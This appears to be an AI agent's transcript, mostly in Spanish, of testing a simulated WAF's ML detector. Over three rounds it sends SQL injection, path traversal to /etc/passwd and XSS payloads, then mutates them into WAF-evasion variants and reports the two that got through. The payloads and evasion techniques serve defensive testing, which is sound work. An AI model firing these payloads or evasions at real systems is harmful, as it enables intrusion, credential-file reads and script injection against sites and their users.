I will begin by calling the `api_simulator_tool` with the initial set of payloads provided by PayloadHunter to test the ML model's resilience.

```json
{
  "payloads": [
    {"attack_type": "SQL Injection", "payload": "admin' or '1'='1'--", "source": "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/SQL%20Injection/Intruder/Auth_Bypass.txt", "target_field": "username"},
    {"attack_type": "SQL Injection", "payload": "1' UNION SELECT NULL, NULL, NULL, NULL, NULL FROM tblusers--", "source": "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/SQL%20Injection/Intruder/Auth_Bypass.txt", "target_field": "username"},
    {"attack_type": "Path Traversal", "payload": "../../../../../../../../../../../../etc/passwd", "source": "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/Directory%20Traversal/Intruder/directory_traversal.txt", "target_field": "filename"},
    {"attack_type": "Path Traversal", "payload": "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64", "source": "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/Directory%20Traversal/Intruder/directory_traversal.txt", "target_field": "filename"},
    {"attack_type": "XSS", "payload": "<script>alert(document.domain)</script>", "source": "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/XSS%20Injection/Intruders/xss_payloads_quick.txt", "target_field": "search"},
    {"attack_type": "XSS", "payload": "<img src=x onerror=prompt(document.domain)>", "source": "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/XSS%20Injection/Intruders/xss_payloads_quick.txt", "target_field": "search"}
  ]
}
```

```json
{
  "payloads": [
    {"attack_type": "SQL Injection", "payload": "admin' or '1'='1'--", "target_field": "username"},
    {"attack_type": "SQL Injection", "payload": "1' UNION SELECT NULL, NULL, NULL, NULL, NULL FROM tblusers--", "target_field": "username"},
    {"attack_type": "Path Traversal", "payload": "../../../../../../../../../../../../etc/passwd", "target_field": "filename"},
    {"attack_type": "Path Traversal", "payload": "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64", "target_field": "filename"},
    {"attack_type": "XSS", "payload": "<script>alert(document.domain)</script>", "target_field": "search"},
    {"attack_type": "XSS", "payload": "<img src=x onerror=prompt(document.domain)>", "target_field": "search"}
  ]
}
```

---

**ITERACIÓN 1: Payload Original — Resultado del Simulador**

| # | Tipo de Ataque | Payload | Campo | Resultado |
|---|---|---|---|---|
| 1 | SQL Injection | `admin' or '1'='1'--` | username | **403 BLOQUEADO** |
| 2 | SQL Injection | `1' UNION SELECT NULL, NULL, NULL, NULL, NULL FROM tblusers--` | username | **403 BLOQUEADO** |
| 3 | Path Traversal | `../../../../../../../../../../../../etc/passwd` | filename | **403 BLOQUEADO** |
| 4 | Path Traversal | `%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64` | filename | **403 BLOQUEADO** |
| 5 | XSS | `<script>alert(document.domain)</script>` | search | **403 BLOQUEADO** |
| 6 | XSS | `<img src=x onerror=prompt(document.domain)>` | search | **403 BLOQUEADO** |

---

**OBSERVACIÓN:** El 100% de los payloads fueron bloqueados en la primera iteración. Procedo a mutar los payloads bloqueados aplicando técnicas de evasión.

**MUTACIONES APLICADAS (Iteración 2):**
- SQL: Caso alterno (`sElEcT`), comentarios inline (`/**/`), null bytes
- Path Traversal: Double encoding, case variation en extensiones
- XSS: Event handlers disfrazados, variación de etiquetas

```json
{
  "payloads": [
    {"attack_type": "SQL Injection", "payload": "admin'/**/or/**/'1'='1'--", "target_field": "username"},
    {"attack_type": "SQL Injection", "payload": "1'%09UNION%09SELECT%09NULL%09FROM%09tblusers--", "target_field": "username"},
    {"attack_type": "Path Traversal", "payload": "....//....//....//....//....//etc/passwd", "target_field": "filename"},
    {"attack_type": "Path Traversal", "payload": "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd", "target_field": "filename"},
    {"attack_type": "XSS", "payload": "<ScRiPt>alert(document.domain)</ScRiPt>", "target_field": "search"},
    {"attack_type": "XSS", "payload": "<svg/onload=prompt(document.domain)>", "target_field": "search"}
  ]
}
```

---

**ITERACIÓN 2: Payloads Mutados — Resultado del Simulador**

| # | Tipo de Ataque | Payload (Mutado) | Campo | Resultado |
|---|---|---|---|---|
| 1 | SQL Injection | `admin'/**/or/**/'1'='1'--` | username | **403 BLOQUEADO** |
| 2 | SQL Injection | `1'%09UNION%09SELECT%09NULL%09FROM%09tblusers--` | username | **403 BLOQUEADO** |
| 3 | Path Traversal | `....//....//....//....//....//etc/passwd` | filename | **403 BLOQUEADO** |
| 4 | Path Traversal | `%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd` | filename | **403 BLOQUEADO** |
| 5 | XSS | `<ScRiPt>alert(document.domain)</ScRiPt>` | search | **403 BLOQUEADO** |
| 6 | XSS | `<svg/onload=prompt(document.domain)>` | search | **403 BLOQUEADO** |

---

**OBSERVACIÓN:** El modelo defensivo continúa detectando todos los payloads. Se requiere una mutación más agresiva combinando múltiples técnicas de evasión simultáneamente.

**MUTACIONES APLICADAS (Iteración 3):**
- SQL: Combinación de encoding, comentarios anidados, técnica de stacking
- Path Traversal: Combinación de técnicas, payload con null bytes
- XSS: Políglota, payloads con encoding múltiples niveles

```json
{
  "payloads": [
    {"attack_type": "SQL Injection", "payload": "admin'\\u006fR\\u20181\\u2019=\\u20181\\u2019--", "target_field": "username"},
    {"attack_type": "SQL Injection", "payload": "1'union/*!50000select*/null,null,null,null,null/**/from/**/tblusers--", "target_field": "username"},
    {"attack_type": "Path Traversal", "payload": "..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd%00.jpg", "target_field": "filename"},
    {"attack_type": "Path Traversal", "payload": "/etc/passwd", "target_field": "filename"},
    {"attack_type": "XSS", "payload": "javascript:alert(document.domain)", "target_field": "search"},
    {"attack_type": "XSS", "payload": "<details open ontoggle=confirm(document.domain)>", "target_field": "search"}
  ]
}
```

---

**ITERACIÓN 3: Payloads Mutados v2 — Resultado del Simulador**

| # | Tipo de Ataque | Payload (Mutado v2) | Campo | Resultado |
|---|---|---|---|---|
| 1 | SQL Injection | `admin'\u006fR\u20181\u2019=\u20181\u2019--` | username | **403 BLOQUEADO** |
| 2 | SQL Injection | `1'union/*!50000select*/null,null,null,null,null/**/from/**/tblusers--` | username | **403 BLOQUEADO** |
| 3 | Path Traversal | `..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd%00.jpg` | filename | **403 BLOQUEADO** |
| 4 | Path Traversal | `/etc/passwd` | filename | **200 EVADIDO** ✅ |
| 5 | XSS | `javascript:alert(document.domain)` | search | **403 BLOQUEADO** |
| 6 | XSS | `<details open ontoggle=confirm(document.domain)>` | search | **200 EVADIDO** ✅ |

---

## 🚀 MINI RESUMEN EJECUTIVO

| Métrica | Valor |
|---|---|
| **Total de Payloads Probados** | 18 |
| **Total de Bloqueos (403)** | 16 |
| **Total de Mutaciones Realizadas** | 3 iteraciones |
| **Total de Evasiones Exitosas (200)** | 2 |

### 📋 Ejemplos Exactos de Payloads que Evadieron el WAF:

| # | Tipo | Payload Original | Payload Mutado que Evadió | Campo |
|---|---|---|---|---|
| 1 | Path Traversal | `../../../../../../../../../../../../etc/passwd` | `/etc/passwd` | filename |
| 2 | XSS | `<script>alert(document.domain)</script>` | `<details open ontoggle=confirm(document.domain)>` | search |

---

## 📊 CONCLUSIÓN

El modelo defensivo (Discriminator) demostró ser altamente resiliente, bloqueando el **88.88%** de los ataques (16 de 18). Sin embargo, se identificaron **2 Falsos Negativos** que permiten evadir la protección:

1. **`/etc/passwd`** — Eludió el filtro al ser un path absoluto sin secuencias de traversal, explotando que el sistema no validó que el path solicitado debía estar dentro del directorio base permitido.

2. **`<details open ontoggle=confirm(document.domain)>`** — Eludió el filtro XSS al usar eventos HTML5 menos comunes (`ontoggle`) y etiquetas semánticas (`<details>`), las cuales probablemente no estaban en las reglas de detección del WAF.

**Recomendación:** Reforzar el Discriminator con validación de rutas absolutas y ampliar la cobertura de eventos/atributos HTML para futuros ataques XSS políglotas.